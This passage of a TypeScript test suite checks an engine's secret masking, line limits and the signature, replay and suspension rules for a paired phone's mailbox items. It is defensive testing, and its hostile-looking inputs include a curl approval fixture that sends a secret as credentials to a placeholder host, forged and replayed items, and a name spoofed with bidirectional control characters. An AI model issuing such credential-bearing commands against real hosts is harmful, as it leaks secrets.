	// No shape of a key's: only knowing it finds it.
	const value = "correct-horse-battery-894";
	knowSecrets("variables/agent-a", [value, "short7!", `  ${"x".repeat(20)}  `, "ab".repeat(10), ""]);
	assert.equal(secretCount(), 1, `only a value of ${LEAST_SECRET} characters or more, and not one or two characters over and over`);
	for (const text of [`DEPLOY_TOKEN=${value} ./deploy`, `line one\n${value}`, `\t${value}`, `\u001b[32m${value}\u001b[0m`, `${value}${value}`, value]) {
		const sent = sentOf({ event: "conversation", items: [[{ text }]] });
		assert.ok(!sent.includes(value) && JSON.parse(sent).items[0][0].text.includes(SECRET_HIDDEN), `${JSON.stringify(text)}: ${sent}`);
	}
	assert.equal(maskKeys(`DEPLOY_TOKEN=${value} ./deploy`), `DEPLOY_TOKEN=${SECRET_HIDDEN} ./deploy`);
	assert.equal(maskKeys(`${value}${value}`), `${SECRET_HIDDEN}${SECRET_HIDDEN}`, "two side by side, each hidden");
	assert.ok(!sentOf({ event: "conversation", items: { [value]: 1 } }).includes(value), "as an object's key");
	assert.equal(maskKeys("short7! and xxxxxxxxxxxxxxxxxxxx and abababababababababab"), "short7! and xxxxxxxxxxxxxxxxxxxx and abababababababababab", "what is too short or too plain is not looked for");
	// A value is found by its ends, its first 8 characters and its last 8, never compared whole (secrets.ts). An answer
	// still coming, sent whole so far each time: hidden once it holds the first 8.
	assert.deepEqual([maskKeys(`token: ${value.slice(0, 7)}`), maskKeys(`token: ${value.slice(0, 8)}`), maskKeys(`token: ${value.slice(0, 20)}`)], [`token: ${value.slice(0, 7)}`, `token: ${SECRET_HIDDEN}`, `token: ${SECRET_HIDDEN}`]);
	assert.equal(maskKeys(`${value.slice(0, 20)} and on`), `${SECRET_HIDDEN}on`, "from its first 8, the value's length is hidden, whatever follows");
	// A text that begins inside one (a background command's kept output, a snippet): hidden up to its last 8.
	for (let cut = 1; cut < value.length; cut++) {
		const masked = maskKeys(`${value.slice(cut)} rest`);
		assert.equal(masked, value.length - cut >= LEAST_SECRET ? `${SECRET_HIDDEN} rest` : `${value.slice(cut)} rest`, `cut ${cut} characters in`);
		assert.equal(maskKeys(`…${value.slice(cut)} rest`), value.length - cut >= LEAST_SECRET ? `${SECRET_HIDDEN} rest` : `…${value.slice(cut)} rest`, `after an ellipsis, cut ${cut} in`);
	}
	// Cut in its middle, as run_code's "characters left out" does: each part hidden by the end it holds.
	const eight = (text: string) => Array.from({ length: value.length - LEAST_SECRET + 1 }, (_, i) => value.slice(i, i + LEAST_SECRET)).filter((part) => text.includes(part));
	for (let cut = 1; cut < value.length; cut++) {
		const middle = maskKeys(`a ${value.slice(0, cut)}\n[… 99 characters left out …]\n${value.slice(cut)} b`);
		assert.deepEqual(eight(middle), [], `cut at ${cut}: ${middle}`);
	}
	// What follows the first 8, or comes before the last 8, is never compared: a phone that reads back text of its own
	// masked or not learns whether 8 characters begin or end a value, and its length, never a value a character at a time.
	for (const rest of [value.slice(8, 15), "?".repeat(value.length - 9), "?".repeat(value.length - 8), ""]) assert.equal(maskKeys(`x ${value.slice(0, 8)}${rest}`), `x ${SECRET_HIDDEN}`, JSON.stringify(rest));
	assert.equal(maskKeys(`x ${value.slice(0, 8)}${"?".repeat(value.length - 5)}`), `x ${SECRET_HIDDEN}???`, "the value's length, no more");
	assert.equal(maskKeys(`${"?".repeat(value.length - 5)}${value.slice(-8)} x`), `???${SECRET_HIDDEN} x`, "and back from its last 8");
	// A background command's output read from any offset (#894): masked over the whole of it, then cut, so that a phone
	// walking the offset reads no 8 characters of what it hides, nor do two answers either side of any split. With a
	// known value, a key's shape (hidden by its prefix, which a cut after it takes away) and a known value whose last 8
	// characters are too plain to stand for it (hidden by its first 8 alone): cutting first, then masking, would show
	// the last two, as the walk checks too.
	const partsOf = (text: string, of: string) => Array.from({ length: of.length - LEAST_SECRET + 1 }, (_, i) => of.slice(i, i + LEAST_SECRET)).filter((part) => text.includes(part));
	const shapedKey = `${"ghp"}_abcdefghijklmnopqrstuvwxyz0123456789AB`;
	const padded = "padded-id-x7Q-00000000";
	knowSecrets("variables/agent-b", [padded]);
	const output = `building\nDEPLOY_TOKEN=${value} GH_TOKEN=${shapedKey} ID=${padded} deployed\n`;
	const shownOf = (text: string) => [...partsOf(text, value), ...partsOf(text, shapedKey.slice(4)), ...partsOf(text, padded)];
	const walked: string[] = [];
	let cutFirstShows = 0;
	for (let from = 0; from <= output.length; from++) {
		const answer = maskKeysFrom(output, from);
		const before = maskKeys(output.slice(0, from));
		walked.push(answer, before);
		// The answer before, as the output stood then, may end inside the key, which a key's shape shows until it is long
		// enough to be one (as a streamed answer always has): only the values are held to it there.
		const valuesOf = (text: string) => [...partsOf(text, value), ...partsOf(text, padded)];
		assert.deepEqual([shownOf(answer), valuesOf(before), valuesOf(before + answer)], [[], [], []], `split at ${from}: ${JSON.stringify([before, answer])}`);
		if (shownOf(maskKeys(output.slice(from))).length > 0) cutFirstShows++;
	}
	assert.deepEqual(shownOf(walked.filter((_, i) => i % 2 === 0).join("")), [], "the whole walk's answers");
	assert.ok(cutFirstShows > 20, `cut first, then masked, ${cutFirstShows} offsets would show part of the key or the plain-ended value`);
	assert.equal(maskKeysFrom(output, output.indexOf(value) + 3), `${SECRET_HIDDEN} GH_TOKEN=${KEY_HIDDEN} ID=${SECRET_HIDDEN} deployed\n`, "from inside it: its mark first");
	assert.equal(maskKeysFrom(output, output.indexOf(shapedKey) + 3), `${KEY_HIDDEN} ID=${SECRET_HIDDEN} deployed\n`, "from inside the key");
	assert.equal(maskKeysFrom(output, output.indexOf(padded) + 3), `${SECRET_HIDDEN} deployed\n`, "from inside the plain-ended value");
	assert.equal(maskKeysFrom(output, 2), `ilding\nDEPLOY_TOKEN=${SECRET_HIDDEN} GH_TOKEN=${KEY_HIDDEN} ID=${SECRET_HIDDEN} deployed\n`);
	// An approval with one in its call is marked shown in part, as for a key's shape, by the channel and the gate alike.
	const inbox = JSON.parse(sentOf({ event: "inbox", items: [{ id: "a", kind: "approval", tool: "bash", arguments: { command: "ls" } }, { id: "b", kind: "approval", tool: "bash", arguments: { command: `curl -u me:${value} https://x.invalid` } }] }));
	assert.deepEqual(inbox.items.map((item: any) => item[PART_HIDDEN] === true), [false, true]);
	assert.equal(inbox.items[1].arguments.command, `curl -u me:${SECRET_HIDDEN} https://x.invalid`);
	assert.ok(hidesSomething({ id: "b", kind: "approval", arguments: { command: `echo ${value}` } }));
	// Where a key's shape and a known value overlap, the run they cover is hidden once.
	const key = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789";
	knowSecrets("credential:anthropic", [key]);
	assert.equal(maskKeys(`x ${key} y`), `x ${KEY_HIDDEN} y`);
	assert.equal(maskKeys(`x ${key}:${value} y`), `x ${KEY_HIDDEN}:${SECRET_HIDDEN} y`, "side by side, each its own");
	assert.equal(maskKeys(`x ${key.slice(0, 20)}${value}`), `x ${KEY_HIDDEN}`, "a key's run that goes on into a value hides both, once");
	assert.equal(maskKeys(`x ${key.slice(0, 20)} y`), `x ${SECRET_HIDDEN}`, "a text that ends less than a value's length after its first 8 characters is hidden to its end");
	// A value of several lines: whole, and line by line; and as JSON writes it inside a string.
	knowSecrets("mcp-variables/server-a", ["first-line-of-it-894\nsecond-line-of-it-894", 'pass"word\\894-x']);
	assert.ok(!maskKeys("cat: second-line-of-it-894").includes("second-line"), "a line of it alone");
	assert.equal(maskKeys(JSON.stringify({ a: 'pass"word\\894-x' })), `{"a":"${SECRET_HIDDEN}"}`);
	assert.equal(maskKeys('pass"word\\894-x'), SECRET_HIDDEN);
	// A value that changes: the new one is looked for from then on, and the old one still, as one removed is (transcripts
	// still hold them), the latest RETIRED_KEPT, the oldest forgotten first.
	const rotated = "rotated-horse-battery-894";
	knowSecrets("variables/agent-a", [rotated]);
	assert.deepEqual([maskKeys(rotated), maskKeys(value)], [SECRET_HIDDEN, SECRET_HIDDEN]);
	for (const source of ["variables/agent-a", "credential:anthropic", "mcp-variables/server-a"]) forgetSecrets(source);
	assert.deepEqual([maskKeys(rotated), maskKeys(key)], [SECRET_HIDDEN, KEY_HIDDEN], "forgotten, still looked for");
	forgetEverySecret();
	const old = (i: number) => `${String(i).padStart(4, "0")}-refreshed-${String(i).padStart(4, "0")}`;
	for (let i = 0; i <= RETIRED_KEPT + 1; i++) knowSecrets("credential:oauth", [old(i)]);
	assert.equal(secretCount(), RETIRED_KEPT + 1, "the one held, and RETIRED_KEPT before it");
	assert.deepEqual([maskKeys(old(0)), maskKeys(old(1)), maskKeys(old(2)), maskKeys(old(RETIRED_KEPT + 1))], [old(0), SECRET_HIDDEN, SECRET_HIDDEN, SECRET_HIDDEN], "the oldest forgotten first");
	forgetEverySecret();
	assert.deepEqual([secretCount(), maskKeys(rotated)], [0, rotated]);

	// The search finds what `indexOf` finds of each value's ends: few letters, so that values overlap, share ends and
	// pieces, and have ends too plain to stand for them (compared whole then), and many values, so that pieces collide.
	let seed = 894;
	const random = (below: number) => {
		seed = (Math.imul(seed, 1_103_515_245) + 12_345) >>> 0;
		return (seed >>> 8) % below;
	};
	const word = (length: number) => Array.from({ length }, () => "abcde"[random(5)]).join("");
	const plainEnd = (text: string) => new Set(text).size < 4;
	for (let round = 0; round < 40; round++) {
		forgetEverySecret();
		const values = [...new Set(Array.from({ length: 1 + random(200) }, () => word(LEAST_SECRET + random(12))))].filter((one) => new Set(one).size >= 4);
		knowSecrets("round", values);
		let text = word(random(4000));
		for (let i = 0; i < 30; i++) {
			const at = random(text.length + 1);
			text = text.slice(0, at) + values[random(values.length)] + text.slice(at);
		}
		// Ending part way into one, and beginning part way into one, as often as not.
		const last = values[random(values.length)]!;
		if (random(2) === 0) text += last.slice(0, random(last.length));
		const first = values[random(values.length)]!;
		if (random(2) === 0) text = first.slice(random(first.length)) + text;
		const longest = new Map<string, number>();
		for (const one of values) {
			for (const [kind, end] of [["head", one.slice(0, LEAST_SECRET)], ["foot", one.slice(-LEAST_SECRET)]] as const) {
				if (!plainEnd(end)) longest.set(`${kind} ${end}`, Math.max(longest.get(`${kind} ${end}`) ?? 0, one.length));
			}
		}
		const hidden = new Uint8Array(text.length);
		for (const [key, length] of longest) {
			const [kind, end] = key.split(" ") as ["head" | "foot", string];
			for (let at = text.indexOf(end); at !== -1; at = text.indexOf(end, at + 1)) {
				if (kind === "head") hidden.fill(1, at, at + length);
				else hidden.fill(1, Math.max(0, at + LEAST_SECRET - length), at + LEAST_SECRET);
			}
		}
		for (const one of values) {
			if (!plainEnd(one.slice(0, LEAST_SECRET)) || !plainEnd(one.slice(-LEAST_SECRET))) continue;
			for (let at = text.indexOf(one); at !== -1; at = text.indexOf(one, at + 1)) hidden.fill(1, at, at + one.length);
		}
		const found = new Uint8Array(text.length);
		for (const [from, to] of secretSpans(text)) found.fill(1, from, to);
		assert.deepEqual(found, hidden, `round ${round}: ${values.length} values`);
	}
	forgetEverySecret();
	// What it costs, in processor time: a line of 8 MiB with none, 10 and 200 values; and the worst a text can do, 8 MiB
	// of the start 200 values share (an OAuth sign-in's tokens refreshed and retired share theirs), which costs no more,
	// since one entry stands for every value of a head.
	const big = "the build passed; src/devices.ts at a1b2c3d4e5f6 ".repeat(Math.ceil((8 << 20) / 49)).slice(0, 8 << 20);
	const sharedStart = "github_pat_11A";
	const shared = sharedStart.repeat(Math.ceil((8 << 20) / sharedStart.length)).slice(0, 8 << 20);
	const costs: string[] = [];
	const spent = (work: () => void) => {
		const began = process.cpuUsage();
		work();
		const used = process.cpuUsage(began);
		return Math.round((used.user + used.system) / 1000);
	};
	for (const count of [0, 10, 200]) {
		knowSecrets("cost", Array.from({ length: count }, (_, i) => `known-value-${i}-${"q".repeat(i % 20)}z`));
		costs.push(`${count}: ${spent(() => assert.equal(secretSpans(big).length, 0))} ms`);
	}
	knowSecrets("cost", Array.from({ length: 200 }, () => `${sharedStart}${randomBytes(30).toString("base64url")}`));
	costs.push(`200 sharing their start, on 8 MiB of it: ${spent(() => assert.deepEqual(secretSpans(shared), [[0, shared.length]]))} ms`);
	forgetEverySecret();
	console.log(`    the known values looked for in 8 MiB (processor time): ${costs.join(", ")}`);

	// A picture's bytes (#956): left as they are only where the engine fills them with a picture it checked by type,
	// `conversation.image`'s answer; the same run anywhere else is masked as before.
	const noisy = pad(`iVBORw0KGgoAAAANSUhEUg/${AIZA_RUN}+7m8yD7`);
	assert.deepEqual(pictureAnswer({ data: noisy, mimeType: "image/png" }), { data: noisy, mimeType: "image/png" });
	for (const [what, result] of [
		["another member", { data: noisy, mimeType: "image/png", note: "x" }],
		["another type than its bytes", { data: noisy, mimeType: "image/jpeg" }],
		["a type no picture is", { data: noisy, mimeType: "text/plain" }],
		["text that is no base64", { data: `iVBORw0KGgo ${AIZA_RUN}`, mimeType: "image/png" }],
		["base64 of no picture", { data: pad(`QUJDREVGR0hJSktM${AIZA_RUN}`), mimeType: "image/png" }],
		["a list", [noisy, "image/png"]],
		["a fifth type, text", { data: Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg"><text>${AIZA_RUN}</text></svg>`).toString("base64"), mimeType: "image/svg+xml" }],
	] as const) {
		assert.equal(pictureAnswer(result), undefined, what);
	}
	// The four types, fixed on the owner's path: one attachments.ts takes later does not reach the exemption.
	assert.deepEqual([...PICTURE_TYPES].sort(), ["image/gif", "image/jpeg", "image/png", "image/webp"]);
	assert.equal(JSON.parse(sentOf({ id: 1, result: { data: noisy, mimeType: "image/png" } })).result.data.includes(KEY_HIDDEN), true, "forDevice itself never leaves a field out, whatever its name");
	assert.ok(JSON.parse(sentOf({ event: "inbox", items: [{ id: "p", kind: "approval", tool: "bash", arguments: { command: `echo ${noisy} | base64 -d > x.png` } }] })).items[0].arguments.command.includes(KEY_HIDDEN), "the same run in an approval's command");
	const dataAddress = sentOf({ event: "conversation", items: [{ id: 3, kind: "assistant", text: `Here: ![shot](data:image/png;base64,${noisy})` }] });
	assert.ok(!dataAddress.includes(AIZA_RUN) && dataAddress.includes(KEY_HIDDEN), "and in a data: address an agent wrote in its answer");
	step("the values of the secrets the engine knows are masked wherever they stand, and an approval holding one marked; too short or too plain is not looked for; a value that changes is looked for from then on; the search finds what indexOf finds");
}

// ---- A phone's longest line, here and in pi² Remote (#904)
{
	// `NAME = <sum of products of whole numbers and names already read>` in pi² Remote's own source, so that one side raised
	// without the other fails here as well as in pi2-remote-helper-check.
	const values: Record<string, number> = {};
	const constant = (file: string, name: string) => {
		const source = readFileSync(new URL(`../../app/Sources/${file.includes("/") ? file : `pi2-remote/${file}`}`, import.meta.url), "utf8");
		const expression = new RegExp(`static let ${name} = ([^\\n]+)`).exec(source)?.[1];
		assert.ok(expression !== undefined, `${name} is found in ${file}`);
		return expression.split("+").reduce((sum, term) => sum + term.split("*").reduce((product, factor) => {
			const value = /^\d+$/.test(factor.trim()) ? Number(factor.trim()) : values[factor.trim()];
			assert.ok(value !== undefined && value > 0, `${factor.trim()} in ${name} is a number`);
			return product * value;
		}, 1), 0);
	};
	values["Remote.phoneLineLimit"] = constant("Remote.swift", "phoneLineLimit");
	assert.equal(values["Remote.phoneLineLimit"], MAX_PHONE_LINE, "pi² Remote takes from a phone the longest line the engine takes");
	assert.equal(constant("EngineLink.swift", "maxLineToEngine"), MAX_HELPER_LINE, "and writes to the engine no longer line than it takes");
	assert.equal(MAX_PHONE_LINE, 72 * 1024 * 1024);
	// The other way (#919): the engine writes pi² Remote no line longer than it takes, which is what a phone takes.
	values["Lines.defaultMaxLength"] = constant("RemoteKit/Frames.swift", "defaultMaxLength");
	assert.equal(constant("EngineLink.swift", "maxLineLength"), MAX_LINE_TO_HELPER, "pi² Remote takes from the engine the longest line the engine writes it");
	assert.equal(values["Lines.defaultMaxLength"], MAX_LINE_TO_HELPER, "and so does a phone once attached, RemoteKit's Lines.defaultMaxLength");
	assert.match(readFileSync(new URL("../../iphone/Sources/Connection/Attach.swift", import.meta.url), "utf8"), /\.maxLineLength = Lines\.defaultMaxLength\n/, "which the phone takes once attached");
	step("a phone's longest line is 72 MiB in pi² Remote and in the engine, and the engine takes it with 64 KiB of wrapping; the engine's longest line to pi² Remote is 64 MiB, what it and a phone take");

	// At the edge, in bytes, the session's wrapping counted: an event over it dropped, an answer over it refused.
	const wrapping = '{"session":"s_x","message":}'.length;
	const head = '{"event":"conversation","text":"';
	const fill = MAX_LINE_TO_HELPER - wrapping - head.length - 2;
	const exact = `${head}${"a".repeat(fill)}"}`;
	assert.equal(sessionLine("s_x", exact)?.length, MAX_LINE_TO_HELPER + 1, "a line of exactly 64 MiB, wrapped, is written whole, with its newline");
	assert.equal(sessionLine("s_x", `${head}${"a".repeat(fill + 1)}"}`), null, "an event one byte over is dropped");
	const wide = `${head}${"é".repeat(Math.floor(fill / 2) + 1)}"}`;
	assert.ok(wide.length < MAX_LINE_TO_HELPER - wrapping, "in characters it is under");
	assert.equal(sessionLine("s_x", wide), null, "and one over in UTF-8 bytes, under in characters");
	for (const id of ["7", '"p11"']) {
		const answer = `{"id":${id},"result":{"text":"${"a".repeat(fill + 64)}"}}`;
		assert.equal(sessionLine("s_x", answer), `{"session":"s_x","message":{"id":${id},"error":${JSON.stringify(ANSWER_NOT_SENT)}}}\n`, `an answer over it is refused, to its id ${id}`);
	}
	assert.equal(sessionLine("s_x", '{"id":1,"result":{}}'), '{"session":"s_x","message":{"id":1,"result":{}}}\n');
	step("a line to pi² Remote of exactly 64 MiB in UTF-8 bytes, wrapped, is written; one byte over, an event is dropped and an answer refused");
}

// ---- A phone of this test's own

const b64url = (bytes: Uint8Array) => Buffer.from(bytes).toString("base64url");
const spki = (key: KeyObject) => b64url(key.export({ type: "spki", format: "der" }));
const p256 = () => generateKeyPairSync("ec", { namedCurve: "P-256" });
const signText = (text: string, key: KeyObject) => b64url(sign("sha256", Buffer.from(text), { key, dsaEncoding: "ieee-p1363" }));
/** The same P-256 key as a compressed point's SPKI, 59 bytes: another text for one key, which the engine refuses (#786). */
const compressed = (key: KeyObject) => {
	const point = key.export({ type: "spki", format: "der" }).subarray(-65);
	const header = Buffer.from("3039301306072a8648ce3d020106082a8648ce3d030107032200", "hex");
	return b64url(Buffer.concat([header, Buffer.from([(point[64]! & 1) === 1 ? 3 : 2]), point.subarray(1, 33)]));
};

class Phone {
	readonly device = p256();
	/** Made again when Face ID is enrolled again (#786). */
	presence = p256();
	readonly record = p256();
	readonly channel = randomBytes(32);
	readonly keyId = randomBytes(32).toString("base64");
	id = "";
	readonly name: string;
	readonly build: string;

	constructor(name = "Alex's iPhone", build = "7") {
		this.name = name;
		this.build = build;
	}

	description() {
		return { name: this.name, model: "iPhone 17 Pro", system: "iOS 27.1", build: this.build, deviceKey: spki(this.device.publicKey), presenceKey: spki(this.presence.publicKey), channelKey: b64url(this.channel), recordKey: spki(this.record.publicKey) };
	}

	/** The `pair` line's content, with App Attest's stand-in made for this key and channel unless told otherwise. */
	claim(pairing: string, binding: Buffer, challenge: Buffer, attest: Record<string, unknown> = {}) {
		const signed = JSON.stringify({ v: 2, kind: "pair", pairing, binding: b64url(binding) });
		const clientDataHash = createHash("sha256").update(challenge).update(this.device.publicKey.export({ type: "spki", format: "der" })).update(binding).digest("base64url");
		const attestation = { standIn: "pi2-app-attest", appId: "ABCDE12345.dev.pi2.ios", keyId: this.keyId, clientDataHash, environment: "development", validationCategory: 3, bundleVersion: this.build, ...attest };
		return { v: 2, device: this.description(), attestation: b64url(Buffer.from(JSON.stringify(attestation))), keyId: this.keyId, signed, signature: signText(signed, this.device.privateKey) };
	}

	/** An attach or resume: `signed` by the device key and the presence key, unless told otherwise. */
	attach(fields: { pairing: string; challenge: string; binding: Buffer; session?: string | null; at?: number }, keys: { device?: KeyObject; presence?: KeyObject | null } = {}) {
		const signed = JSON.stringify({ v: 2, kind: "attach", pairing: fields.pairing, device: this.id, session: fields.session ?? null, binding: b64url(fields.binding), challenge: fields.challenge, build: this.build, at: fields.at ?? Date.now() });
		const presence = keys.presence === null ? "" : signText(signed, keys.presence ?? this.presence.privateKey);
		return { signed, signature: signText(signed, keys.device ?? this.device.privateKey), presence };
	}

	/** An offer of a new presence key (#786): `signed` by the device key and by the key offered, unless told otherwise. */
	offer(fields: { pairing: string; challenge: string; binding: Buffer; presenceKey: string; build?: string; at?: number }, keys: { device?: KeyObject; presence: KeyObject }) {
		const signed = JSON.stringify({ v: 2, kind: "presenceKey", pairing: fields.pairing, device: this.id, binding: b64url(fields.binding), challenge: fields.challenge, presenceKey: fields.presenceKey, build: fields.build ?? this.build, at: fields.at ?? Date.now() });
		return { signed, signature: signText(signed, keys.device ?? this.device.privateKey), presence: signText(signed, keys.presence) };
	}

	/** A request sealed for the mailbox, once opened. */
	item(pairing: string, method: string, params: Record<string, unknown>, options: { at?: number; nonce?: string; presence?: KeyObject | null } = {}) {
		const signed = JSON.stringify({ v: 2, kind: "request", pairing, device: this.id, method, params, nonce: options.nonce ?? b64url(randomBytes(16)), at: options.at ?? Date.now() });
		return { v: 2, request: { method, params }, signed, signature: signText(signed, this.device.privateKey), presence: options.presence === null ? "" : signText(signed, options.presence ?? this.presence.privateKey) };
	}
}

// ---- Sealed items from the mailbox, against a real store, through a restart (4.3)

{
	const folder = mkdtempSync(join(work, "store-"));
	const phone = new Phone();
	phone.id = `dev_${b64url(randomBytes(16))}`;
	const pairing = b64url(randomBytes(16));
	const record: Device = { id: phone.id, ...phone.description(), pendingPresenceKey: null, attestKeyId: phone.keyId, suspendedAt: null, pairedAt: Date.now(), lastSeenAt: null, lastPath: null, revokedAt: null };
	const open = async () => {
		const harness = await Harness.open(await openNodeSqliteStorage(join(folder, "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
		await wireDevices({ harness, context, log: () => {}, release: false, names: { conversation: () => undefined, project: () => undefined } });
		return harness;
	};
	let harness = await open();
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		doc.pairing = pairing;
		doc.remote = { ...doc.remote, preview: true, on: true };
		doc.macName = "Kim\u200D\u202E's Mac";
		doc.devices.push(record);
	}, context);
	await harness.close(context);
	harness = await open();
	assert.equal(macNameNow(), "Kim's Mac", "the Mac's name the payload and a phone are given, stripped");
	const none = () => null;
	const take = (item: unknown, now?: number) => checkRequestItem(phone.id, item, { approvalSwitch: none, approvalHidden: () => false }, now);
	const logged = async () => {
		await flushDeviceLog();
		return (await harness.snapshot(DeviceLog, context))?.entries.length ?? 0;
	};
	const suspended = () => devicesState().devices.find((one) => one.id === phone.id)!.suspendedAt !== null;
	// What the relay could hand pi² Remote "from" the device, with none of its keys: refused, and nothing written or counted.
	const stranger = new Phone();
	stranger.id = phone.id;
	for (let i = 0; i < 20; i++) {
		const unsignedItem = { ...phone.item(b64url(randomBytes(16)), `made.up.${i}`, {}), signature: "" };
		await assert.rejects(take(unsignedItem), /not signed by the device key/);
		await assert.rejects(take(stranger.item(pairing, "submit", { id: 4, text: `${i}` })), /not signed by the device key/);
	}
	assert.equal(await logged(), 0, "20 unsigned items and 20 a stranger signed write nothing in the log");
	assert.equal(suspended(), false, "and do not suspend the device");
	const good = phone.item(pairing, "submit", { id: 4, text: "from the train" });
	assert.deepEqual(await take(good), { method: "submit", params: { id: 4, text: "from the train" }, widens: false });
	await assert.rejects(take(good), /taken before/, "a nonce is taken once");
	const hourAgo = Date.now() - 3_600_000 - 1_000;
	assert.deepEqual((await take(phone.item(pairing, "inbox.decide", { id: "a", decision: "once" }, { at: hourAgo }))).widens, false, "an answer that does not widen keeps a day");
	await assert.rejects(take(phone.item(pairing, "inbox.decide", { id: "a", decision: "always" }, { at: hourAgo })), new RegExp(ITEM_TOO_OLD_FACE), "one that widens, an hour");
	assert.equal((await take(phone.item(pairing, "inbox.decide", { id: "a", decision: "always" }))).widens, true);
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "late" }, { at: Date.now() - 25 * 3_600_000 })), new RegExp(ITEM_TOO_OLD));
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "ahead" }, { at: Date.now() + 6 * 60_000 })), /ahead of the Mac's/);
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "x" }, { presence: null })), /presence signature/, "a presence signature is missing");
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "x" }, { presence: p256().privateKey })), /presence signature/, "by another key");
	const forged = phone.item(pairing, "submit", { id: 4, text: "x" });
	await assert.rejects(take({ ...forged, request: { method: "submit", params: { id: 4, text: "y" } } }), /not the one signed/);
	await assert.rejects(take({ ...forged, signature: signText(forged.signed, p256().privateKey) }), /device key/);
	await assert.rejects(take({ ...forged, extra: 1 }), /not a request/, "no field it does not know");
	await assert.rejects(take(phone.item(pairing, "github.merge", { projectId: "p", number: 1 })), new RegExp(ONLY_ON_THE_MAC), "its row must allow the mailbox");
	await assert.rejects(take(phone.item(b64url(randomBytes(16)), "abort", { id: 4 })), /another device or pairing/);
	const replay = phone.item(pairing, "abort", { id: 4 });
	await take(replay);
	await harness.close(context);
	harness = await open();
	await assert.rejects(take(replay), /taken before/, "after a restart too");
	assert.equal(suspended(), false, "two refused presence signatures do not suspend");
	step("sealed items: the device key's signature first, before anything is logged or counted; then the presence signature, a day (an hour if it widens), its row, and each nonce once, stored before the answer, through a restart");

	// A new Face ID key that waits to be accepted signs no item (#786); the accepted key still does.
	const waitingKey = p256();
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		for (const one of doc.devices) if (one.id === phone.id) one.pendingPresenceKey = spki(waitingKey.publicKey);
	}, context);
	await harness.close(context);
	harness = await open();
	assert.equal(devicesState().devices.find((one) => one.id === phone.id)!.pendingPresenceKey, spki(waitingKey.publicKey));
	await assert.rejects(take(phone.item(pairing, "abort", { id: 4 }, { presence: waitingKey.privateKey })), /presence signature is not the presence key's/, "an item signed by the waiting key");
	assert.equal((await take(phone.item(pairing, "abort", { id: 4 }))).method, "abort", "one signed by the accepted key");
	step("a waiting Face ID key signs no sealed item, and the accepted one still does");

	// A relay that kept a device's genuine items replays them after the person accepted a new Face ID key: each is refused
	// as too old or taken before, ahead of the presence signature, and none counts towards suspension (#921's security
	// read).
	const threeDaysAgo = Date.now() - 3 * 86_400_000;
	const keptByRelay = Array.from({ length: 5 }, (_, i) => phone.item(pairing, "submit", { id: 4, text: `kept ${i}` }, { at: threeDaysAgo }));
	const takenOnce = phone.item(pairing, "abort", { id: 4 });
	assert.equal((await take(takenOnce)).method, "abort");
	const renewed = p256();
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		for (const one of doc.devices) {
			if (one.id !== phone.id) continue;
			one.presenceKey = spki(renewed.publicKey);
			one.pendingPresenceKey = null;
		}
	}, context);
	await harness.close(context);
	harness = await open();
	for (const item of keptByRelay) await assert.rejects(take(item), new RegExp(ITEM_TOO_OLD), "a genuine item three days old, under the old key");
	for (let i = 0; i < 5; i++) await assert.rejects(take(takenOnce), /taken before/, "one genuine item handed over again, under the old key");
	assert.equal(suspended(), false, "five old items and one item five times, replayed after a new Face ID key, do not suspend the device");
	step("a relay replaying a device's old or taken items after a new Face ID key cannot get it suspended: age and nonce come before the presence signature");

	// A relay that held back five genuine items, signed under the old key within the day, delivers them once a new Face ID
	// key was accepted (#921's reader's probe, which suspended the device): each is refused for its presence signature
	// and logged, and none counts towards suspension, nor does one handed over five times (#891): only live attaches count.
	const heldBack = Array.from({ length: 5 }, (_, i) => phone.item(pairing, "submit", { id: 4, text: `held back ${i}` }, { at: Date.now() - 3_600_000 }));
	for (const item of heldBack) await assert.rejects(take(item), /presence signature is not the presence key's/, "a fresh genuine item under the old key");
	for (let i = 0; i < 5; i++) await assert.rejects(take(heldBack[0]!), /presence signature is not the presence key's/, "one handed over again");
	assert.equal(suspended(), false, "ten refused presence signatures of sealed items do not suspend the device");
	await flushDeviceLog();
	const itemRefusals = (await harness.snapshot(DeviceLog, context))!.entries.filter((entry) => entry.device === phone.id && entry.path === "mailbox" && entry.outcome === "refused");
	assert.ok(itemRefusals.some((entry) => entry.method === "submit" && entry.why === "The item's presence signature is not the presence key's."), "they are logged as refused");
	step("five genuine items a relay held back under the old Face ID key, delivered after a new one was accepted, are refused and logged, and do not suspend the device");

	// A live attach refused only because the key that signed its presence waits to be accepted on the Mac is answered
	// with the `presence` reason, logged, and not counted (#891). Every other refusal counts as before, a key waiting or
	// not: a presence signature neither key made, a used challenge, another channel, another pairing, a stale time.
	const mac = { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() } as unknown as Client;
	const attachWith = (presence: KeyObject | null, change: { challenge?: string; signedBinding?: Buffer; pairing?: string; at?: number } = {}) => {
		const binding = randomBytes(32);
		const fields = { pairing: change.pairing ?? pairing, challenge: change.challenge ?? attachChallenge().challenge, binding: change.signedBinding ?? binding, ...(change.at === undefined ? {} : { at: change.at }) };
		return checkAttach({ attach: phone.attach(fields, { presence }), binding: b64url(binding), path: "relay" });
	};
	const refusedFor = (why: RegExp | string, reason?: string) => (error: Error & { data?: unknown }) => {
		assert.ok(typeof why === "string" ? error.message === why : why.test(error.message), error.message);
		assert.deepEqual(error.data, reason === undefined ? undefined : { reason });
		return true;
	};
	// Four of a kind leave the device as it was; the fifth suspends it, and the Mac resumes it, clearing the count.
	const counts = async (what: string, made: () => Promise<unknown>, why: RegExp | string, reason?: string) => {
		for (let i = 0; i < 4; i++) await assert.rejects(made(), refusedFor(why, reason), what);
		assert.equal(suspended(), false, `four do not suspend: ${what}`);
		await assert.rejects(made(), refusedFor(why, reason), what);
		assert.equal(suspended(), true, `the fifth suspends: ${what}`);
		await deviceRequests["devices.resume"]!({ device: phone.id }, mac);
	};
	assert.equal((await attachWith(renewed.privateKey)).device.id, phone.id, "the accepted key attaches");
	const offered = p256();
	const offerBinding = randomBytes(32);
